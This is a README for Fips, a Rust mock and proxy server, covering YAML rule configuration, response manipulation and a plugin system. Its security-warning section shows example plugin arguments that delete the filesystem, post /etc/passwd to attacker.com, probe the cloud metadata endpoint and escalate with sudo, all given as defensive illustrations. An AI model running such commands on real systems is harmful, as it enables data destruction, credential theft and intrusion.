# Fake Injecting Proxy Server - in short Fips - fake and proxy within seconds

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

## ⚠️ Security Warning

**FIPS plugins are extremely powerful and can execute arbitrary code on your system.** Plugins have full access to:
- File system (read/write any file)
- Network (make HTTP requests to internal/external services)
- System commands (execute any command the server user can run)
- Environment variables (access secrets, API keys, credentials)

**DO NOT:**
- Use untrusted plugins in production
- Allow user input to control plugin arguments
- Run FIPS with elevated privileges unless necessary
- Expose plugin-enabled endpoints to untrusted networks

See [`plugins/system_callout/SECURITY.md`](plugins/system_callout/SECURITY.md) for detailed security considerations.

## About

Fips provides three different functionalities: It can function as a Fake data server, it can function as a simple proxy server, and it can be a mixture of both, manipulating responses on the fly - defined by your own rules. As such, Fips is best used if you wish to quickly setup an endpoint and test it in your application - the backend work is currently blocked? No problem. Start the application and host a mock endpoint while proxying the remainders of your endpoints to the actual backend.

## Installation

- Install [rust and cargo](cargo).
- Checkout this repo.
- Dir into it and run `cargo run` - or `cargo build` if you wish to produce an executable.

## Cli Arguments
Also see `fips(.exe) --help`
```yaml
  # Start fips on this port
  --port: 8888
  # Load plugins from this directory, detault is the current directory.
  --plugins: .
  # Load configuration files from this directory. default is the current directory.
  --config: .
```

## Hotkeys:
<kbd>Tab</kbd> Go to next Tab  
<kbd>Shift</kbd>+ <kbd>Tab</kbd> Go to previous Tab  
<kbd>c</kbd> clear the log output  
<kbd>r</kbd> reload config files  
<kbd>Esc</kbd> quit  

## Usage

Fipss configuration is placed in `.yaml` or `.yml` files. They are loaded at startup from the `--config` directory.
For each request, Fips will check against the configuration files if any config object matches the current request URI.
If it does, one of the four modes do apply explicitly by the configuration given.

❗ **Things to keep in mind for your config:**

- Fips uses regex to match against paths. `/foo/bar` in a config path will also match for `/foo/bar/baz`, so you need to be as explicit as possible if you care.
- If multiple rules match, only the first matching rule will apply.
- Rules are applied in the order they appear - order matters!.
- The config file is not checked for spelling, the server will panic if it is unable to read a configuration file due to spelling /indentation errors. To support you creating configs, fips provides a JSON schema. You can create it with the `--write-schema` cli argument. See the settings for [vscode json-schema][vscode-json-schema] and [vscode yaml-schema][vscode-yaml-schema] on how to point vscode to the created schema file.
- Object manipulation uses the [dotpath crate](dotpath). The syntax is noted below.

## Example configuration in `config.yaml`

See also the `examples` directory for more example configurations.

1. Any request arriving at Fips with the URI `/foo/bar` will return `['this is a lot of fun']`

```yaml
- Rule:
    name: "My Mock Rule"
    when:
      matchesUris:
        - uri: ^/foo/bar$
    then:
      functionAs: "Mock"
      body: ['this is a lot of fun']
      status: "200"
```

2. Any request against `/foo/*anything*/bar/` will be proxied to the server at `localhost:4041`, the `Authorization` Header will be forwarded

```yaml
- Rule:
    name: "Proxy Rule"
    when:
      matchesUris:
        - uri: ^/foo/.*/bar$
    then:
      functionAs: "Proxy"
      forwardUri: 'http://localhost:4041'
      forwardHeaders:
        - 'Authorization'
```

3. Any request against `/foo/*anything*/bar/` will be proxied to the server at `localhost:4041`, the `content-type` Header will be returned. Lastly we append another `user` to our response.

```yaml
- Rule:
    name: "Fips Rule"
    when:
      matchesUris:
        - uri: ^/foo/.*/bar$
    then:
      functionAs: "Fips"
      forwardUri: "http://localhost:4041"
      returnHeaders:
        - "content-type"
      modifyResponse:
        body:
          - at: ">>"
            with:
              firstname: "Morty"
              lastname: "Smith"
              status: "cloned himself"
```

## All configuration parameters for each rule type:

Configuration options for the Fips function (Mock and Proxy combination):
```yaml
- Rule:
    # This name will be displayed for debugging purposes
    name: String
    when:
      # List of URIs to match (regex patterns)
      matchesUris:
        - uri: String
      # Only apply a rule if the method matches these
      matchMethods: Vec<String>
      # Only apply a rule if the request body contains the given string
      matchBodyContains: Option<String>
    then:
      functionAs: "Fips"
      # Forward any incoming request to this uri and return the response
      forwardUri: String
      # Forward matching headers on the request
      forwardHeaders: Vec<String>
      # Return these headers from the original response
      returnHeaders: Vec<String>
      # Set the response status
      status: String
      # Add these headers to the response
      headers: HashMap<String, String>
      # Apply these transformations on the response
      modifyResponse:
        setHeaders: HashMap<String, String>
        body:
          - at: String  # json_dotpath location
            with: Value # json value to insert
    with:
      # Sleep for ms
      sleep: u64
      # Only apply a rule with this probability. It's best to have a fallback rule defined
      matchProbability: Option<f32>
      # Plugin configuration (see plugins section below)
      plugins: Vec<PluginConfig>
```
Configuration options for the Proxy function:
```yaml
- Rule:
    # This name will be displayed for debugging purposes
    name: String
    when:
      # List of URIs to match (regex patterns)
      matchesUris:
        - uri: String
      # Only apply a rule if the method matches these
      matchMethods: Vec<String>
      # Only apply a rule if the request body contains the given string
      matchBodyContains: Option<String>
    then:
      functionAs: "Proxy"
      # Forward any incoming request to this uri and return the response
      forwardUri: String
      # Forward matching headers on the request
      forwardHeaders: Vec<String>
      # Return these headers from the original response
      returnHeaders: Vec<String>
      # Add these headers to the response
      headers: HashMap<String, String>
    with:
      # Sleep for ms
      sleep: u64
      # Only apply a rule with this probability. It's best to have a fallback rule defined
      matchProbability: Option<f32>
```

Configuration options for the Mock function:
```yaml
- Rule:
    # This name will be displayed for debugging purposes
    name: String
    when:
      # List of URIs to match (regex patterns)
      matchesUris:
        - uri: String
      # Only apply a rule if the method matches these
      matchMethods: Vec<String>
      # Only apply a rule if the request body contains the given string
      matchBodyContains: Option<String>
    then:
      functionAs: "Mock"
      # Add these items to the response body
      body: Serde<Value>
      # Set the response status
      status: String
      # Add these headers to the response
      headers: HashMap<String, String>
    with:
      # Sleep for ms
      sleep: u64
      # Only apply a rule with this probability. It's best to have a fallback rule defined
      matchProbability: Option<f32>
      # Plugin configuration (see plugins section below)
      plugins: Vec<PluginConfig>
```

Configuration options to host static files:
```yaml
- Rule:
    # This name will be displayed for debugging purposes
    name: String
    when:
      # List of URIs to match (regex patterns)
      matchesUris:
        - uri: String
      # Only apply a rule if the method matches these
      matchMethods: Vec<String>
    then:
      functionAs: "Static"
      # host files from this directory
      baseDir: String
      # Add these headers to the response
      headers: HashMap<String, String>
    with:
      # Sleep for ms
      sleep: u64
```


Body modification rules (used in modifyResponse.body):
```yaml
   # The json_dotpath (see more at Object manipulation on the response)
   at: String
   # Any json serializeable item that is added to the response at the path location
   with: Serde<Value>
```


## Object manipulation on the response

```json
{
  "fruit": [
    { "name": "lemon", "color": "yellow" },
    { "name": "apple", "color": "green" }
  ]
}
```

- "" ... the whole object
- "fruit" ... the fruits array
- "fruit.0" ... the first fruit object, {"name": "lemon", "color": "yellow"}
- "fruit.1.name" ... the second (index is 0-based) fruit's name, "apple"
- < ... first element
- \> ... last element
- \- or << ... prepend
- \+ or >> ... append
- <n, e.g. <5 ... insert before the n-th element
- \>n, e.g. >5 ... insert after the n-th element

## Extension

One of Fipss key features is its extension system. Fips exports a rust macro `export_plugin`.
Your extension can make use of this macro to register a plugin.
The plugins name will be matched against your configuration. If a match occurs, the pattern will be replaced
with the output of your plugin. All plugins matching your OS in the `plugins` directory relative to the Fips binary will be loaded automatically at startup.

Example plugin implementation:

```rust
use fips::{PluginRegistrar, Function, InvocationError};
use fake::{faker::name::raw::NameWithTitle, locales::EN, Fake};
use serde_json::Value

pub struct Random;

impl Function for Random {
    fn call(&self, args: Vec<Value>) -> Result<String, InvocationError> {
        let random_fake_name: String = NameWithTitle(EN).fake();
        let json_serializable = format!("{{\"bar\": [\"{}\"]}}", random_fake_name).to_owned();
        Ok(json_serializable)
    }
}

fips::export_plugin!(register);

extern "C" fn register(registrar: &mut dyn PluginRegistrar) {
    registrar.register_function("Name", Box::new(Random));
}
```

Above code registers the plugin on the Fips plugin registry.  The plugins `name` `{{Name}}` will be matched when a matching rule is found, the `json serializeable(!)` return value will be used to replace your pattern in the matching rule.

Example `config.yaml`

```yaml
- Rule:
    name: "Random Name Generator"
    when:
      matchesUris:
        - uri: ^/randomname$
    then:
      functionAs: "Mock"
      body:
        foo: '{{Name}}'
      status: "200"
    with:
      plugins:
        - name: "Name"
          path: './plugins/libname_plugin.so'
```

Example output of `curl localhost:8888/randomname/ | jq`

```json
{
  "foo": {
    "bar": ["Ms. Destiney Metz"]
  }
}
```

Plugins can also be passed arguments via the configuration files. If you wish to do so, the plugin has to be configured in the `with` section:

```yaml
- Rule:
    name: "Random Name with Args"
    when:
      matchesUris:
        - uri: ^/randomname$
    then:
      functionAs: "Mock"
      body:
        foo: '{{Name}}'
      status: "200"
    with:
      plugins:
        - name: "Name"
          path: './plugins/libname_plugin.so'
          args: [ "foo", 1, "bar" ]
```

### ⚠️ Plugin Security: System Callout Demonstration

The `system_callout` plugin demonstrates the **power and danger** of FIPS plugins:

**Capabilities:**
```yaml
- Rule:
    name: "System Command Example"
    when:
      matchesUris:
        - uri: ^/demo/system$
    then:
      functionAs: "Mock"
      body:
        date: "{{SystemCommand}}"
        username: "{{SystemCommand}}"
        home_dir: "{{GetEnvVar}}"
        file_content: "{{ReadFile}}"
        http_data: "{{HttpRequest}}"
      status: "200"
    with:
      plugins:
        - name: "SystemCommand"
          path: "./plugins/system_callout/target/release/libsystem_callout.dylib"
          args: ["date"]
        - name: "SystemCommand"
          path: "./plugins/system_callout/target/release/libsystem_callout.dylib"
          args: ["whoami"]
        - name: "GetEnvVar"
          path: "./plugins/system_callout/target/release/libsystem_callout.dylib"
          args: ["HOME"]
        - name: "ReadFile"
          path: "./plugins/system_callout/target/release/libsystem_callout.dylib"
          args: ["./Cargo.toml"]
        - name: "HttpRequest"
          path: "./plugins/system_callout/target/release/libsystem_callout.dylib"
          args: ["http://httpbin.org/ip"]
```

**Security Risks:**
- ❌ Command injection: `args: ["rm", "-rf", "/"]`
- ❌ Data exfiltration: `args: ["curl", "http://attacker.com", "-d", "@/etc/passwd"]`
- ❌ SSRF attacks: `args: ["http://169.254.169.254/latest/meta-data/"]`
- ❌ Privilege escalation: `args: ["sudo", "..."]`

**See full security documentation:** [`plugins/system_callout/SECURITY.md`](plugins/system_callout/SECURITY.md)

**Best Practices:**
1. ✅ Only use trusted plugins from verified sources
2. ✅ Never allow user input in plugin arguments
3. ✅ Run FIPS with minimal privileges
4. ✅ Use sandboxing/containers in production
5. ✅ Audit all plugin configurations
6. ✅ Monitor plugin execution logs

## Testing

Fips includes a comprehensive test suite with **48 tests** covering all major functionality:

```bash
# Run all tests
cargo test

# Run specific test suite
cargo test --test configuration_tests
cargo test --test integration_tests

# Run with test script
./scripts/run_tests.sh

# Generate coverage report (requires cargo-tarpaulin)
./scripts/run_tests.sh --coverage
```

For detailed testing documentation, see [TESTING.md](TESTING.md) and [TEST_SUMMARY.md](TEST_SUMMARY.md).

## License 

This Project is Licensed under the [MIT License](LICENSE)

[cargo]: https://doc.rust-lang.org/cargo/getting-started/installation.html
[dotpath]: https://crates.io/crates/json_dotpath
[vscode-json-schema]: https://code.visualstudio.com/docs/languages/json#_mapping-in-the-user-settings
[vscode-yaml-schema]: https://marketplace.visualstudio.com/items?itemName=redhat.vscode-yaml
